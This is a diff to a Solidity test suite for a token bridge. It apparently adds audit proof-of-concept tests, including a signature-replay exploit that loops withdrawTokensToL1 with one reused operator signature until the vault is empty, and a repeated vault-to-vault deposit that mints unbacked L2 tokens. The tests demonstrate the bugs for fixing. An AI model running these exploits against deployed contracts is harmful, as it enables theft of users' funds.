@@ -243,11 +243,42 @@ contract L1BossBridgeTest is Test {
 
     function testCanTransferFromVaultToVault() public {
         address attacker = makeAddr("attacker");
+
         uint256 vaultBalance = 500 ether;
         deal(address(token), address(vault), attacker, vaultBalance);
 
         vm.expectEmit(address(tokenBridge));
         emit Deposit(address(vault), attacker, vaultBalance);
         tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
+
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, vaultBalance);
+        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
+    }
+
+    function testSingaturRepay() public {
+        address attacker = makeAddr("attacker");
+        uint256 vaultInitialBalance = 100e18;
+        uint256 attackerInitalBalance = 100e18;
+        deal(address(token), address(vault), vaultInitialBalance);
+        deal(address(token), address(attacker), attackerInitalBalance);
+
+        vm.startPrank(attacker);
+        token.approve(address(tokenBridge), type(uint256).max);
+        tokenBridge.depositTokensToL2(attacker, attacker, attackerInitalBalance);
+
+        bytes memory message = abi.encode(
+            address(token), 0, abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, attackerInitalBalance))
+        );
+        (uint8 v, bytes32 r, bytes32 s) =
+            vm.sign(operator.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
+
+        while (token.balanceOf(address(vault)) > 0) {
+            tokenBridge.withdrawTokensToL1(attacker, attackerInitalBalance, v, r, s);
+        }
+
+        assertEq(token.balanceOf(address(attacker)), attackerInitalBalance + vaultInitialBalance);
+
+        assertEq(token.balanceOf(address(vault)), 0);
     }
 }
